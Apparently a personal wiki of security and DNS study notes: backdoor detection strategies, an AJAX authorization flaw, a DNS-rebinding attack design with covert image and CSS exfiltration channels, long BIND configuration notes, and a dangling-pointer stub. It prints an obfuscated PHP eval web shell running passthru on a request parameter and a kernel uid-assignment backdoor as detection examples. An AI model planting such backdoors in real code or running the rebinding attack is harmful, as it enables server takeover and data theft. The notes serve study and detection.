The attacker inserts logic and special credentials into the program code. The special credentials are in the form of a special username, password, password hash, or key. The logic is a comparison to the special credential logic that inserts the special credential into the designed credential store. 

//''Detection Strategies''// include identifying static variables that look like usernames and passwords. Start with all strings using ASCII character set. Also inspect known crypto API calls where these strings are passed in as plaintext data.

!!!Hidden Functionality
Hidden Functionality backdoors allow the attacker to issue commands or authenticate without performing the desinged authentication procedure. Hidden funcitonality backdoors often use special parameters to trigger special logic within the program that shouldn't be there. 

//''Detection Strategies''// include recongnising common patterns in the scripting languages: create an obfuscated string, input into deobfuscation function, call eval() on the result of the deobfucsation. Payload code often allows command execution or auth bypass. Identify GET or POST parameters passed by web applications then compare them to form fields in HTML and JSP pages to find fields that only appear on the server side. 

''Uninntended Network Activity''
This may involve a number of techniques including listening on undocuemented ports, making outbound connections to establish a command and control channel, or leaking sensitive information over the network via STMP, HTTP, UDP, ICMP or other protocols. 

//Detection Strategies// include identifying all locations in the codebase that call functions responsible for establishing connections or sending/receiving connectionless data, such as connect(), bind(), accept(), sendto(), listen() and recvfrom(). Once these calls have been identified pay particular attention to any outbound network activiity that reference a hard-coded IP address or port. Keep in mind that many applications have functionality built in to automaticallly chekc for updates, so seeing at least one hard-coded outbound connection is not uncommon. 

''Manipulation of ~Security-Critical Parameters''
In any program, certain variables or parameters are more significant than others from a security standpoint. In application code, consider variables used to store the results of authentication or authorisation functions, or other security mechanisms. By directly manipulationg these parameters or introducing flawed logic to comparisons against them. 

{{{
if ((options == (__WCLONE|__WALL)) &amp;&amp;
	(current-&gt;uid = 0))
	retval = -EINVAL;
}}}

The second half of the conditional assigns current-&gt;uid to zero rather than comparing it with zero. As a result, a calling process is granted root privilieges if it calls wait4() with the _WCLONE and _WALL options set.

!Self-modifying Code

Any code that modifies itself at run-time is immediately suspicious. This behaviour is used commonly in scripting languages but can just as easily appear in native code. Conider the following example in PHP
{{{
eval(base64_decode(&quot;cGFzc3RocnUoJF9HRVRbJ2NtZCddKTs=&quot;));
}}}
When the PHP script executes, this line of code evaluates the result of the base64_decode() operations as a PHP command. Therefore, if the decoded string contains valid PHP, it will be executed in the context of the running process.
{{{
eval(&quot;passthru($_GET('cmd'));})
}}}
The effect of the resulting code is to parse the &quot;cmd&quot; parameter from the HTTP request, and call the passthru() function, which executes the supplied command on the server.

<pre>In order to make partial page updates more useful, it can be worthwhile to increase the granuality of your server-side functions. It would be pointless to expose a single ''~Do-It'' operation that provides no user feedback while it is processing. Providing more finely grained server-side api helps third party websites to create effective mashups from your application. On the other hand, attackers can easily subver the intended application workflow and call functions out of order, change the parameter values of the calls, or omit the calls entirely

A real world example of this design flaw is a function which updates the password for a user

{{{
public string updatePassword(string custID, string newPassword)
}}}

There are not authentication ro authorization checks enforced on this code. anyone can call this function and change any user's password to any desired value. This code was probably originally a private method called during a page postback, and auth was enforced earlier in the call stack. However once the application was converted to ajax and the method visibility change to publc, the code became vulnerable.

Asynchrous operation implies mutli-threaded operations. The use of multiple threads of execution opens the door to classic threading problems such as race conditions and deadlocks.

<pre>!DNS Spoofing

''DNS Spoofing'' attacks against web browsers are primarly intended to trick a browser into violating the ''same origin policy''. Since same-origin applies to hosts, but not IP addresses, an attacker could use a DNS server he controls to erase the distinction between two different servers. This is the basic attack sequence

#Get the victim browser a site (probably using XSS) on a attacker-controlled domain.
#The victim browser queries the DNS server for the attack domain and receives the attacker-controlled IP address.
#The victim browser requests content from the attack server and becomes infected with the attack code. 
#The attack pauses long enough for the DNS record's TTL to expire. 
#The attack code initiates a new request to the DNS server, and requeries DNS server.
#The attack DNS server responds with the IP address of the victim server.
#The attack code connects to the victim server, and does something useful 
#The results are returned to the user

!DNS Pinning

To prevent DNS Spoofing attacks, browser makers introduced DNS pinning. This forces the browser into using a single IP address for any given host. Once the DNS response has been received, the browser will pin it in the cache as long as the browser is running. 

!Fundamentals of ~Anti-DNS Pinning Attacks

Most techinques for defeating DNS pinning exploit the necessity to eventually expire the DNS record. One method has this sequence

#The victim browser load the attack code
#The victim broswer closes, either by user action or by attack
#When the browser is opened, the attack code is loaded from the disk cache
#The attack code initiates a request to the attack web server ( should be victim web server ? )
#The attack ~DNS-server responds with the IP address of the victim server

This technique is difficult to defeat by browser design because the browser must dump its DNS cache eventually, and becasue a disk based content cache is considered critical for modern browsers. 

Considering that major web browsers do not fully implement DNS pinning, there is a much simpler attack. To support ~DNS-based fault tolerance, browsers will dump their DNS cache if the web browser becomes unavailable. The attack sequence becomes much simpler to execute

#The victim browser loads the attack code
#The attacker firewalls the attack web server
#The attack code initiates a request to the attack web server
#The request times out and the browser dumps its DNS cache
#The browser requeries and receives the IP address of the victim server

!Practical ~Anti-DNS Attacks Using Javascript

''Victim Browser :'' Tricked into visiitng a malicious site, probably via XSS, the victim browser loads code that periodically polls the attack server for new commands. Ex. Javascript appends a new script tag onto the document body. The source of the tag is a request to the controller script, which returns either a blank document, or new ~JavaScript commands.

''Browser based ~JavaScript Proxy :'' The primary purpose of this code is to relay requests and responses between the attack server and the victim web server. In the demonstatrion, it is loaded in an iFrame from the attack server by the victim browser's polling process.

''Controller script :'' A CGI script with many functions identified by a 'command' parameter. The script is hosted on two IP addresses; one is used for performing the anti-DNS pinning attack with the randomly generated hostname, the other is used for communicating commands between other components. Key functions include

#An attack console listing all active victim browsers, and commands that can be sent
#Periodically polled by the victim browser for new commands
#Changes DNS records and firewall rules as needed to facilitate the actual anti-DNS pinning attack
#Periodically polled by the Javascript proxy for new requests to process
#Receives the HTTP responses from the ~JavaScript proxy

!Data Exchange

''~JavaScript Proxy and victim web server''
The ~XMLHTTPRequest ( XHR) object is used to initiate requests to the web server. Normally XHR can only handle text data and will effectively strip off the high ASCII bit. By setting the character to 'x-user-defined', the browser will retain all 8-bits of data, allowing for full binary data support.

''Javascript Proxy to Controller Script''
Because of the same origin rule, XHR is not suitable for returning data to the attack server. There are two methods used in the demonstration. If it is a small amount of text data, an image object is created with the source pointing at the controller script. The data is included as a parameter value in the URL's query string. When the image is appended to the document, the browser will automatically generate the request. No image is actually returned by the controller script.

''Controller script to ~JavaScript Proxy''
Since a browser cannot accept inbound network connections, the ~JavaScript proxy must initiate all communication. When the ~JavaScript proxy polls the contorller script for data (such as the next HTTP request to process), the response is ~JavaScript file with the data set in variables that can be retrieved by the ~JavaScript proxy.

In essence, this is intentional XSS: the document is loaded the randomly generated hostname, but the script is loaded from the attack server's secondary IP address (or secondary hostname). As a result, some anti-XSS filters might block this request. However, no XSS is required for a successful attack.

There are several other methods to transfer data from the controller script besided XSS. While the same-origin policy prevents most explicit data exchange, ~JavaScript can still infer data about content from different origins. For example: the dimensions of an image are accessible in ~JavaScript, regardless of which server provided the file. This allows for a series of images to be requested by ~JavaScript with one byte encoded in the width and one byte in the height. Firefox will load bitmap with headers, but no graphic content, allowing the files to be stripped down to 66-bytes. While this technique is slow, it is effective. Considering that cross-domain image loading is very common on the internet, it would be extermely difficult to detext and block.

A similar technique tunnels data through dynamically loaded Cascading Style Sheets. Again, most data in a different origin CSS cannot be directly accessed by ~JavaScript. However, some data in a style class can be inferred once it is applied to a document component. Margin sizes are one example, Firefox allows margins to be set to millions to pixels, allowing at least two bytes of data to be encoded in each margin setting. Bulk data can be transferred by creating series of sequentially named classes. Once the style sheet is loaded, it is trivial for ~JavaScript to apply each class to a DIV tag, measure the actual margin sizes, and then decode the data. Since an unlimited number of classes can be defined in a single style sheet, performance is much better than the image dimension method, and approaches the XSS method.

<pre>!Types of Nameservers
A primary master nameserver for a zone reads the data for the zone from a file on its host. A secondary master nameserver for a zone gets the zone data from another nameserver authoritative for the zone, called its master server. Quite often, the master server is the zone's primary master, but that's not required: a secondary master can load zone data from another secondary. Nowadays, the preferred term for a secondary master nameserver is a slave.

!Queries
Queries come in two flavors, recursive and iterative, also called nonrecursive. Recursive queries place most of the burden of resolution on a single nameserver. Recursion, or recursive resolution, is just a name for the resolution process used by a nameserver when it receives recursive queries. 
In recursion, a resolver sends a recursive query to a nameserver for information about a particular domain name. The queried nameserver is then obliged to respond with the requested data or with an error stating either that data of the requested type doesn't exist or that the domain name specified doesn't exist.[*] The nameserver can't just refer the querier to a different nameserver, because the query was recursive. If the queried nameserver isn't authoritative for the data requested, it will have to query other nameservers to find the answer.

!Setting Up Zone Data
The DNS version of the data has multiple files. One file maps all the hostnames to addresses. Other files map the addresses back to hostnames. A file that maps hostnames to addresses is called db.DOMAIN. For movie.edu, this file is called db.movie.edu. The files mapping addresses to hostnames are called db.ADDR, where ADDR is the network number without trailing zeros or the specification of a netmask. In our example, the files are called db.192.249.249 and db.192.253.253; there's one for each network. There are a few other zone datafiles: db.cache and db.127.0.0. 

!Zone Data Files
DNS lookups are case-insensitive, so you can enter names in your zone datafiles in uppercase, lowercase, or mixed case. However, even though lookups are case-insensitive, case is preserved. That way, if you add records for Titanic.movie.edu to your zone data, people looking up titanic.movie.edu will find the records, but with a capital &quot;T&quot; in the domain name. 

Resource records must start in the first column of a line. The order of resource records in the zone datafiles is as follows: 

* SOA record 
** Indicates authority for this zone 
* NS record 
** Lists a nameserver for this zone 
* A 
** Name-to-address mapping 
* PTR 
** Address-to-name mapping 
* CNAME 
** Canonical name (for aliases) 

!!!SOA record
{{{
@ movie.edu. IN SOA toystory.movie.edu. al.movie.edu. (
                          1        ; Serial
                          3h       ; Refresh after 3 hours
                          1h       ; Retry after 1 hour
                          1w       ; Expire after 1 week
                          1h )     ; Negative caching TTL of 1 hour
}}}
The first name after SOA (toystory.movie.edu.) is the name of the primary nameserver for the movie.edu zone. The second name (al.movie.edu.) is the mail address of the person in charge of the zone if you replace the first &quot;.&quot; with an &quot;@&quot;. Often you'll see root, postmaster, or hostmaster as the email address. Nameservers won't use this address; it's meant for human consumption. 

Serial number can any number like date, but it should always increase with changes to zone data. Slaves when contacting master check the serial number for verification of any changes. 

'retry' value is used if slave cannot reach the master currently and when to retry connecting to the master. 

'expire' declares when the slave will expire the cached data. If master could not reached even after retries then the config expires after expire time. 

add similar SOA records to the beginning of the db.192.249.249 and db.192.253.253 files. In these files, we change the first name in the SOA record from movie.edu. to the name of the appropriate in-addr.arpa zone: 249.249.192.in-addr.arpa. and 253.253.192.in-addr.arpa., respectively. 

!!!NS record
We add one NS record for each nameserver authoritative for our zone. Here are the NS records from the db.movie.edu file: 
{{{
movie.edu.  IN NS  toystory.movie.edu.
movie.edu.  IN NS  wormhole.movie.edu.
}}}
As with the SOA record, we add NS records to the db.192.249.249 and db.192.253.253 files, too. 


!!!Address and Alias records
{{{

wh253.movie.edu.          IN A     192.253.253.1
}}}
A CNAME record maps an alias to its canonical name. When a nameserver looks up a name and finds a CNAME record, it replaces the name with the canonical name and looks up the new name. For example, when the nameserver looks up wh.movie.edu, it finds a CNAME record pointing to wormhole.movie.edu. It then looks up wormhole.movie.edu and returns both addresses. 

There is one thing to remember about aliases like toys.movie.edu: they should never appear on the right side of a resource record. Notice that the NS records we just created use the canonical name. 

if a host is multihomed (has more than one network interface), create an address (A) record for each alias unique to one address and then create a CNAME record for each alias common to all the addresses. 

!!!PTR record
{{{
1.249.249.192.in-addr.arpa.  IN PTR wormhole.movie.edu.
2.249.249.192.in-addr.arpa.  IN PTR shrek.movie.edu.
3.249.249.192.in-addr.arpa.  IN PTR toystory.movie.edu.
4.249.249.192.in-addr.arpa.  IN PTR monsters-inc.movie.edu.
}}}
Addresses should point to only a single name: the canonical name. 

!!!MX record
MX records specify a mail exchanger for a domain name: a host that will either process or forward mail for the domain name. Processing the mail means either delivering it to the individual to whom it's addressed or gatewaying it to another mail transport, such as X.400. Forwarding means sending it to its final destination or to another mail exchanger closer to the destination via SMTP

{{{
plange.puntacana.dr.  IN  MX  1 listo.puntacana.dr.
plange.puntacana.dr.  IN  MX  2 hep.puntacana.dr.
}}}
specifies that listo.puntacana.dr is a mail exchanger for plange.puntacana.dr at preference value 10. Taken together, the preference values of a destination's mail exchangers determine the order in which a mailer should use them. Mailers should attempt delivery to the mail exchangers with the lowest preference values first. The most preferred mail exchanger has the lowest preference value.

To prevent mail from looping between mail servers, mailers discard certain MX records before they decide where to send a message. A mailer sorts the list of MX records by preference value and looks in the list for the canonical domain name of the host on which it's running. If the local host appears as a mail exchanger, the mailer discards that MX record and all MX records in which the preference value is equal or higher (that is, equally or less-preferred mail exchangers). That prevents the mailer from sending messages to itself or to mailers &quot;farther&quot; from the eventual destination. 

!!!Responsible Person and TXT record
The record takes two arguments as its record-specific data: an electronic mail address in domain name format and a domain name pointing to additional data about the contact. The electronic mail address is in the same format the SOA record uses: it substitutes a &quot;.&quot; for the &quot;@&quot;. The next argument is a domain name, which must have a TXT record associated with it. The TXT record then contains free-format information about the contact, such as full name and phone number. If you omit either field, you must specify the root domain (&quot;.&quot;) as a placeholder instead. 
Here are some example RP (and associated) records: 
{{{
shrek        IN  RP   root.movie.edu.  hotline.movie.edu.
             IN  RP   snewman.movie.edu.  sn.movie.edu.
hotline      IN  TXT  &quot;Movie U. Network Hotline, (415) 555-4111&quot;
sn           IN  TXT  &quot;Sommer Newman, (415) 555-9612&quot;
}}}

!BIND configuration
On a primary server, the configuration file contains one zone statement for each zone datafile to be read. Each line starts with the keyword zone followed by the zone's domain name and the class (in stands for Internet). The type master indicates this server is a primary nameserver. The last line contains the filename: 
{{{
zone &quot;movie.edu&quot; in {
      type master;
      file &quot;db.movie.edu&quot;;
};
zone &quot;249.249.192.in-addr.arpa&quot; in {
        type master;
        file &quot;db.192.249.249&quot;;
};
zone &quot;253.253.192.in-addr.arpa&quot; in {
        type master;
        file &quot;db.192.253.253&quot;;
};
zone &quot;0.0.127.in-addr.arpa&quot; in {
        type master;
        file &quot;db.127.0.0&quot;;
};
zone &quot;.&quot; in {
        type hint;
        file &quot;db.cache&quot;;
};
}}}
By default, BIND expects the configuration file to be named /etc/named.conf. The zone datafiles for our example are in the directory /var/named.

!Configuring Slave
{{{
zone &quot;movie.edu&quot; in {
      type slave;
      file &quot;bak.movie.edu&quot;;
      masters { 192.249.249.3; };
};
}}}
The slave nameserver keeps a backup copy of this zone in the local file bak.movie.edu. 

!sortlist directive 
{{{
sortlist 128.32.42.0/255.255.255.0 15.0.0.0
}}}
The resolver sorts any addresses in a reply that match these arguments into the order in which they appear in the directive, and appends addresses that don't match to the end. 

!options directive
BIND 8.2 introduced four new resolver options: attempts, timeout, rotate, and no-check-names. attempts allows you to specify how many queries the resolver should send to each nameserver in resolv.conf before giving up (default:2). timeout allows you to specify the initial timeout for a query to a nameserver in resolv.conf. The default value is five seconds. For the second and successive rounds of queries, the resolver still doubles the initial timeout and divides by the number of nameservers in resolv.conf. rotate lets your resolver use all the nameservers in resolv.conf, not just the first one. 

Note that many programs can't take advantage of this because they initialize the resolver, look up a name, then exit. Rotation has no effect on repeated ping commands, for example, because each ping process initializes the resolver, queries the first nameserver in resolv.conf, and then exits before using the resolver again. Each successive invocation of ping has no idea which nameserver the previous one usedor even that ping was run earlier. But long-lived processes that send lots of queries, such as a sendmail daemon, can take advantage of rotation. 

!ndc and controls
You send messages to a nameserver via the control channel using a program called ndc (in BIND 8) or rndc (in BIND 9). Prior to BIND 8.2, ndc was simply a shell script that allowed you to substitute convenient arguments (such as reload) for signals (such as HUP). We'll talk about that version of ndc later in this chapter. 

Executed without arguments, ndc will try to communicate with a nameserver running on the local host by sending messages through a Unix domain socket. The socket is usually called /var/run/ndc. You can also use ndc to send messages across a TCP socket to a nameserver, possibly remote from the host that you're running ndc on. To use this mode of operation, run ndc with the -c command-line option, specifying the name or address of the nameserver, a slash, and the port on which it's listening for control messages. For example: 
{{{
# ndc -c 127.0.0.1/953
}}}

To configure your nameserver to listen on a particular TCP port for control messages, use the controls statement: 
{{{
controls {
    inet 127.0.0.1 port 953 allow { localhost; };
};
controls {
    inet * port 953 allow { localnets; };
};
}}}

!rndc and controls
{{{
controls {
       inet * allow { any; } keys { &quot;rndc-key&quot;; };
};
}}}

This determines which cryptographic key rndc users must authenticate themselves with to send control messages to the nameserver. If you leave the keys specification out, you'll see this message after the nameserver starts: 
{{{
Jan 13 18:22:03 terminator named[13964]: type 'inet' control channel
has no 'keys' clause; control channel will be disabled
}}}
The key or keys specified in the keys substatement must be defined in a key statement: 
{{{
key &quot;rndc-key&quot; {
        algorithm hmac-md5;
        secret &quot;Zm9vCg==&quot;;
};
}}}
The key statement can go directly in named.conf, but if your named.conf file is world-readable, it's safer to put it in a different file that's not world-readable and include that file in named.conf: 
{{{
include &quot;/etc/rndc.key&quot;;
}}}
The only algorithm currently supported is HMAC-MD5, a technique for using the fast MD5 secure hash algorithm to do authentication.[*] The secret is simply the base-64 encoding of a password that named and authorized rndc users will share. You can generate the secret using programs such as mmencode or dnssec-keygen from the BIND distribution. For example, you can use mmencode to generate the base-64 encoding of foobarbaz: 
{{{
% mmencode foobarbaz
CmZvb2JhcmJh
}}}

If your version of BIND comes with rndc-confgen, you can let the tool do most of the work for you. Simply run: 
{{{
# rndc-confgen &gt; /etc/rndc.conf

Here is what you'll see in /etc/rndc.conf: 
# Start of rndc.conf
key &quot;rndc-key&quot; {
    algorithm hmac-md5;
    secret &quot;4XErjUEy/qgnDuBvHohPtQ==&quot;;
};
options {
    default-key &quot;rndc-key&quot;;
    default-server 127.0.0.1;
    default-port 953;
};
# End of rndc.conf
# Use with the following in named.conf,
# adjusting the allow list as needed:
#
# key &quot;rndc-key&quot; {
#     algorithm hmac-md5;
#     secret &quot;4XErjUEy/qgnDuBvHohPtQ==&quot;;
# };
#
# controls {
#     inet 127.0.0.1 port 953
#         allow { 127.0.0.1; } keys { &quot;rndc-key&quot;; };
# };
# End of named.conf
}}}

** Dump information about the recursive queries currently being processed to the file named.recursing in the current working directory. 

!!!Adding or Deleting hosts 
* Update the serial number in db.DOMAIN.
* Add any A (address), CNAME (alias), and MX (mail exchanger) records for the host to the db.DOMAIN file.
* Update the serial number and add PTR records to each db.ADDR file for which the host has an address.
* Reload the primary nameserver; this forces it to load the new information:
** # rndc reload
** # rndc reload movie.edu

!Caching-only name servers
Creating caching-only nameservers is another alternative when you need more servers. Caching-only nameservers are nameservers not authoritative for any zones (except 0.0.127.in-addr.arpa). The named.conf file for a caching-only server contains these lines: 
{{{
options {
    directory &quot;/var/named&quot;;  // or your data directory
};
zone &quot;0.0.127.in-addr.arpa&quot; {
    type master;
    file &quot;db.127.0.0&quot;;
};
zone &quot;.&quot; {
    type hint;
    file &quot;db.cache&quot;;
};
}}}

!Subdomain in Parent's zone
By creating resource records that refer to the subdomain within the parent's zone.
{{{
brazil.personnel      IN  A      192.253.253.10
                      IN  MX     10 brazil.personnel.movie.edu.
                      IN  MX     100 postmanrings2x.movie.edu.
employeedb.personnel  IN  CNAME  brazil.personnel.movie.edu.
db.personnel          IN  CNAME  brazil.personnel.movie.edu.
}}}

!Delegating a subdomain

      86400    IN    NS    outland.fx.movie.edu.
bladerunner.fx.movie.edu.  86400  IN  A  192.253.254.2
outland.fx.movie.edu.      86400  IN  A  192.253.254.3
}}}

!Subdomains in in-addr.arpa domain
Within its db.172.20 zone datafile, it needs to add NS records like these: 
{{{
2     86400    IN    NS    gump.fx.altered.edu.
15    86400    IN    NS    prettywoman.makeup.altered.edu.
15    86400    IN    NS    priscilla.makeup.altered.edu.
25    86400    IN    NS    blowup.foley.altered.edu.

200.1.15.in-addr.arpa.    86400    IN    NS    ns-1.cns.hp.com.
201.1.15.in-addr.arpa.    86400    IN    NS    ns-1.cns.hp.com.
}}}

!Dynamic DNS updates
For the most part, dynamic update functionality is used by programs such as DHCP servers that assign IP addresses automatically to computers and then need to register the resulting name-to-address and address-to-name mappings. Some of these programs use the new ns_update() resolver routine to create update messages and send them to an authoritative server for the zone that contains the domain name. 

It's also possible to create updates manually with the command-line program nsupdate, which is part of the standard BIND distribution. nsupdate reads one-line commands and translates them into an update message. Commands can be specified on standard input (the default) or in a file, whose name must be given as an argument to nsupdate. Commands not separated by a blank line are incorporated into the same update message, as long as there's room. 
nsupdate understands the following commands: 

* prereq yxrrset domain name type [rdata] 
** Makes the existence of an RRset of type type owned by domain name a prerequisite for performing the update specified in successive update commands. If rdata is specified, it must also match. 
* prereq nxrrset domain name type 
** Makes the nonexistence of an RRset of type type owned by domain name a prerequisite for performing the update specified. 
* prereq yxdomain domain name 
** Makes the existence of the specified domain name a prerequisite for performing the update. 
* prereq nxdomain domain name 
** Makes the nonexistence of the specified domain name a prerequisite for performing the update. 
* update delete domain name [type] [rdata] 
** Deletes the domain name specified or, if type is also specified, deletes the RRset specified or, if rdata is also specified, deletes the record matching domainname, type, and rdata. 
* update add domain name ttl [class] type rdata 
** Adds the record specified to the zone. Note that the TTL, in addition to the type and resource record-specific data, must be included, but the class is optional and defaults to IN. 
So, for example, the command: 
{{{
% nsupdate
&gt; prereq nxdomain mib.fx.movie.edu.
&gt; update add mib.fx.movie.edu. 300 A 192.253.253.16
&gt; send
% nsupdate
&gt; prereq yxrrset mib.fx.movie.edu. MX
&gt; update delete mib.fx.movie.edu. MX
&gt; update add mib.fx.movie.edu. 600 MX 10 mib.fx.movie.edu.
&gt; update add mib.fx.movie.edu. 600 MX 50 postmanrings2x.movie.edu.
&gt; send
}}}

As with queries, the nameservers that process dynamic updates answer them with DNS messages that indicate whether the update was successful and, if not, what went wrong. Updates may fail for many reasons: for example, because the nameserver wasn't actually authoritative for the zone being updated, because a prerequisite wasn't satisfied, or because the updater wasn't allowed. 
There are some limitations to what you can do with dynamic update: you can't delete a zone entirely (though you can delete everything in it except the SOA record and one NS record), and you can't add new zones. 

When a nameserver processes a dynamic update, it's changing a zone and must increment that zone's serial number to signal the change to the zone's slaves. This is done automatically. However, the nameserver doesn't necessarily increment the serial number for each dynamic update. 

BIND 8 nameservers defer updating a zone's serial number for as long as 5 minutes or 100 updates, whichever comes first. The deferral is intended to deal with a mismatch between a nameserver's ability to process dynamic updates and its ability to transfer zones: the latter may take significantly longer for large zones. When the nameserver does finally increment the zone's serial number, it sends a NOTIFY announcement (described later in this chapter) to tell the zone's slaves that the serial number has changed. BIND 9 nameservers update the serial number once for each dynamic update that is processed. 

when they receive dynamic updates, both BIND 8 and 9 nameservers simply append a short record of the update to a logfile.[*] The change takes effect immediately in the copy of the zone the nameservers maintain in memory, of course. But the nameservers can wait and write the entire zone to disk only at a designated interval (hourly, usually). BIND 8 nameservers then delete the logfile because it's no longer needed. (At that point, the copy of the zone in memory is the same as that on disk.) BIND 9 nameservers, however, leave the logfile because they also use it for incremental zone transfers, which we'll cover later in this chapter. (BIND 8 nameservers keep incremental zone transfer information in another file.)

allow-update takes an address match list as an argument. The address or addresses matched by the list are the only addresses allowed to update the zone. It's prudent to make this access control list as restrictive as possible: 
{{{
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    allow-update { 192.253.253.100; }; // just our DHCP server
};
}}}

The allow-update-forwarding substatement takes an address match list as an argument. Only updates from IP addresses that match the address match list will be forwarded. So the following zone statement forwards only those updates from the Special Effects Department's subnet: 
{{{
zone &quot;fx.movie.edu&quot; {
    type slave;
    file &quot;bak.fx.movie.edu&quot;;
    allow-update-forwarding { 192.253.254/24; };
};
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    allow-update { key dhcp-server.fx.movie.edu.; }; // allow only updates
                                                     // signed by the DHCP
                                                     // server's TSIG key
};
So, if the host mummy.fx.movie.edu uses a key called mummy.fx.movie.edu to sign its dynamic updates, we can restrict mummy.fx.movie.edu to updating its own records with the following: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant mummy.fx.movie.edu. self mummy.fx.movie.edu.; };
};

or just its own address records with this: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant mummy.fx.movie.edu. self mummy.fx.movie.edu. A; };
};

More generally, we can restrict all our clients to updating only their own address records using: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant *.fx.movie.edu. self fx.movie.edu. A; };
};
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy {
        grant dhcp-server.fx.movie.edu. wildcard *.fx.movie.edu. A TXT PTR;
    };
};
}}}

!DNS NOTIFY (Zone Change Notification)
When does the nameserver notice a change? Restarting a primary nameserver causes it to notify all its slaves as to the current serial number of all of its zones because the primary has no way of knowing whether its zone datafiles were edited before it started. Reloading one or more zones with new serial numbers causes a nameserver to notify the slaves of those zones. And a dynamic update that causes a zone's serial number to increment also causes notification. 
{{{
zone &quot;fx.movie.edu&quot; {
    type slave;
    file &quot;bak.fx.movie.edu&quot;;
    notify yes;
    also-notify { 15.255.152.4; }; // This is a BIND 8 slave, which
                                   // must be explicitly configured
                                   // to notify its slave
};
}}}

!Incremental Zone Transfer (IXFR)
{{{
options {
    directory &quot;/var/named&quot;;
    ixfr-from-differences yes;
};
}}}

!Forwarding
A primary or slave nameserver's mode of operation changes slightly when it is configured to use a forwarder. If a resolver requests records that are already in the nameserver's authoritative data or cached data, the nameserver answers with that information; this part of its operation hasn't changed. However, if the records aren't in its database, the nameserver sends the query to a forwarder and waits a short period for an answer before resuming normal operation and starting the iterative name resolution process. This mode of operation is called forward first. What the nameserver is doing differently here is sending a recursive query to the forwarder, expecting it to find the answer. At all other times, the nameserver sends out only nonrecursive queries to other nameservers. 

You may want to restrict your nameservers even furtherstopping them from even trying to contact an off-site server if their forwarder is down or doesn't respond. You can do this by configuring your nameservers to use forward-only mode.

{{{
options {
    forwarders { 192.249.249.1; 192.249.249.3; };
    forward only;
};
}}}

!Round-robin load balancing
{{{
foo.bar.baz.    60    IN    A    192.168.1.1
foo.bar.baz.    60    IN    A    192.168.1.2
foo.bar.baz.    60    IN    A    192.168.1.3
}}}
It's a good idea to reduce the records' time to live, too, as we did in this example. This ensures that if the addresses are cached on an intermediate nameserver that doesn't support round-robin, they'll time out of the cache quickly. If the intermediate nameserver looks up the name again, your authoritative nameserver can round-robin the addresses again. 

!rrset-order
if we want to ensure that the address records for www.movie.edu are always returned in the same order, we'd use this rrset-order substatement:
{{{
options {
    rrset-order {
        class IN type A name &quot;www.movie.edu&quot; order fixed;
    };
};
options {
    rrset-order {
        order random;
    };
};
options {
    rrset-order {
        type A name &quot;*.movie.edu&quot; order cyclic;
    };
};
}}}
The default behavior is: 
{{{
options {
    rrset-order {
        class IN type ANY name &quot;*&quot; order cyclic;
    };
};
}}}

!TSIG
 transaction signatures, or TSIG for short. TSIG uses shared secrets and a one-way hash function to authenticate DNS messages, particularly responses and updates. With TSIG configured, a nameserver or updater adds a TSIG record to the additional data section of a DNS message. The TSIG record &quot;signs&quot; the DNS message, proving that the message's sender had a cryptographic key shared with the receiver and that the message wasn't modified after it left the sender. 

TSIG provides authentication and data integrity through the use of a special type of mathematical formula called a one-way hash function. A one-way hash function, also known as a cryptographic checksum or message digest, computes a fixed-size hash value based on arbitrarily large input. The magic of a one-way hash function is that each bit of the hash value depends on each and every bit of the input. Change a single bit of the input, and the hash value changes dramatically and unpredictablyso unpredictably that it's &quot;computationally infeasible&quot; to reverse the function and find an input that produces a given hash value. 

TSIG uses a one-way hash function called MD5. In particular, it uses a variant of MD5 called HMAC-MD5. HMAC-MD5 works in a keyed mode in which the 128-bit hash value depends not only on the input, but also on a key. 

we need to configure both nameservers with a common key: 
{{{
key toystory-wormhole.movie.edu. {
    algorithm hmac-md5;
    secret &quot;skrKc4Twy/cIgIykQu7JZA==&quot;;
};
}}}

{{{
# dnssec-keygen -a HMAC-MD5 -b 128 -n HOST toystory-wormhole.movie.edu.
Ktoystory-wormhole.movie.edu.+157+28446
}}}

There's one last problem that we see cropping up frequently with TSIG: time synchronization. The timestamp in the TSIG record is useful for preventing replay attacks, but it tripped us up initially because the clocks on our nameservers weren't synchronized. (They need to be synchronized to within five minutes, the default value for &quot;fudge.&quot;) 

If you're only concerned about zone transfers (and not about general query traffic, for example), you can specify the key in the masters substatement for any slave zones:  Now, on toystory.movie.edu, we can restrict zone transfers to those signed with the toystory-wormhole.movie.edu key: 
{{{
zone &quot;movie.edu&quot; {
    type slave;
    masters { 192.249.249.1 key toystory-wormhole.movie.edu.; };
    file &quot;bak.movie.edu&quot;;
};

zone &quot;movie.edu&quot; {
    type master;
    file &quot;db.movie.edu&quot;;
    allow-transfer { key toystory-wormhole.movie.edu.; };
};
}}}

!Firewall
Internal nameservers that can directly query nameservers on the Internet don't require any special configuration. Their root hints files contain the Internet's root nameservers, which enables them to resolve Internet domain names. Internal nameservers that can't query nameservers on the Internet, however, need to know to forward queries they can't resolve to one of the nameservers that can. This is done with the forwarders substatement,

Ours is a packet-filtering firewall, and we negotiated with our firewall administrator to allow DNS traffic between Internet nameservers and two of our nameservers, toystory.movie.edu and wormhole.movie.edu. Here's how we configured the other internal nameservers at the university. For our BIND 8 and 9 nameservers, we used the following: 
{{{
options {
    forwarders { 192.249.249.1; 192.249.249.3; };
    forward only;
};


options {
    directory &quot;/var/named&quot;;
    forwarders { 192.249.249.1; 192.253.253.3; };
};
zone &quot;movie.edu&quot; {
    type slave;
    masters { 192.249.249.3; };
    file &quot;bak.movie.edu&quot;;
    forwarders {};
};
}}}

<pre>!Dangling Pointer

The most common result of this bug is the crash of the application or running thread. This is a nuisance, but not a code injection security threat. However, imagine if one could control the data that the dangling pointer points to. If that were possible, one could alter the behaviour of the application and even inject malicious code into it.

Objects that use virtual functions contain a pointer to their ''VFTABLE'' which is a table of pointers to the object's virtual functions. The ''VFTABLE'' pointer is always located in the first ''DWORD'' of the object's memory area. The ''VFTABLE'' is compiled into every instance of the class.

The basic priniciple of exploitation is overwriting the old object memory space with malicious data

